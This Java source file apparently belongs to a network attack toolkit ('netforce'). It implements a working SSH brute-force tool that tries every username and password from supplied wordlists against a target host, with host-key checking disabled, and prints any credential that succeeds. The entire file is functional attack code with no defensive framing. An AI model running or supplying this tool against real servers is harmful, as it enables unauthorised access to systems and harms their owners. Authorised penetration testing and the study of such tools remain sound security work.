package dev.thatcherclough.netforce;

import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.io.File;
import java.util.Scanner;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.Ansi.Color;
import org.fusesource.jansi.Ansi.Erase;

public class Bruteforce {

	/**
	 * Starts a brute force attack on an SSH server with user/file {@link username}
	 * at host {@link host} with port {@link port} and timeout {@link timeout} using
	 * password/file {@link password}.
	 *
	 * @param host     host of SSH server to brute force
	 * @param port     port of SSH server to brute force
	 * @param username user or file containing users to use
	 * @param password password or file containing passwords to use
	 * @param timeout  timeout for connecting to SSH server
	 */
	public static void start(String host, int port, String username, String password, int timeout) {
		Scanner in = null;
		try {
			ArrayList<String> users = getArrayList(username);
			ArrayList<String> passes = getArrayList(password);
			System.out.println("Brute forcing " + host + ":" + port + "\n");
			for (String user : users)
				for (String pass : passes) {
					System.out.print(Ansi.ansi().eraseLine(Erase.BACKWARD).cursorToColumn(0) + "Trying user '" + user
							+ "' with password '" + pass + "'");
					try {
						check(host, port, user, pass, timeout);
						System.out.println(Ansi.ansi().eraseLine(Erase.BACKWARD).cursorToColumn(0).fgBright(Color.GREEN)
								+ "Password for " + user + "@" + host + ":" + port + " is '" + pass + "'");
						return;
					} catch (Exception e) {
						if (e.getMessage().equals("Auth fail"))
							continue;
						else
							throw e;
					}
				}
			System.out.println(Ansi.ansi().eraseLine(Erase.BACKWARD).cursorToColumn(0).fgBright(Color.RED)
					+ "Could not find user and/or password for " + host + ":" + port);
		} catch (Exception e) {
			System.out.print(Ansi.ansi().eraseLine(Erase.BACKWARD).cursorToColumn(0));
			e.printStackTrace();
		} finally {
			if (in != null)
				in.close();
			System.exit(0);
		}
	}

	/**
	 * Attempts to connect to an SSH server with user {@link user} at host
	 * {@link host} with port {@link port}, password {@link password}, and timeout
	 * {@link timeout}.
	 *
	 * @param host     host of SSH server
	 * @param port     port of SSH server
	 * @param user     user to connect to
	 * @param password password to connect with
	 * @param timeout  timeout for connecting to SSH server
	 * @throws JSchException
	 */
	private static void check(String host, int port, String user, String password, int timeout) throws JSchException {
		JSch ssh = new JSch();
		Session session = ssh.getSession(user, host, port);
		session.setConfig("StrictHostKeyChecking", "no");
		session.setTimeout(timeout);
		session.setPassword(password);
		session.connect();
		session.disconnect();
	}

	/**
	 * If {@link toGet} is a file name, returns {@link java.util.ArrayList} of lines
	 * from that file. Otherwise, returns {@link java.util.ArrayList} containing
	 * {@link toGet}.
	 *
	 * @param toGet filename or string to return in {@link java.util.ArrayList}
	 * @return {@link java.util.ArrayList} contains either data from the file with
	 *         name {@link toGet} or {@link toGet}
	 * @throws FileNotFoundException
	 */
	private static ArrayList<String> getArrayList(String toGet) throws FileNotFoundException {
		ArrayList<String> ret = new ArrayList<String>();
		if (new File(toGet).isFile()) {
			Scanner in = new Scanner(new File(toGet));
			while (in.hasNextLine())
				ret.add(in.nextLine());
			in.close();
		} else
			ret.add(toGet);
		return ret;
	}
}